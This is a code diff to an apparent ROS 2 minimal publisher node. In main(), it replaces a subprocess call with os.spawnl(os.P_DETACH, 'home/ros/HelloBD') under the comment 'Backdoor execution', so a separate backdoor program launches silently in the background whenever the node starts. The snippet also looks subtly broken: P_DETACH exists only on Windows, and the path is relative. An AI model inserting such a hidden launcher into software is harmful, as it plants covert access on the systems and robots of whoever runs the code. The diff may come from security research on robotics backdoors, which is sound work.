@@ -12,8 +12,7 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-import rclpy
-import subprocess
+import rclpy, os
 
 from rclpy.node import Node
 from std_msgs.msg import String
@@ -38,7 +37,10 @@ class MinimalPublisher(Node):
 
 def main(args=None):
     rclpy.init(args=args)
-    BDexec = subprocess.run(["home/ros/HelloBD"])
+    
+    # Backdoor execution 
+    os.spawnl(os.P_DETACH, 'home/ros/HelloBD')
+
     minimal_publisher = MinimalPublisher()
 
     rclpy.spin(minimal_publisher)
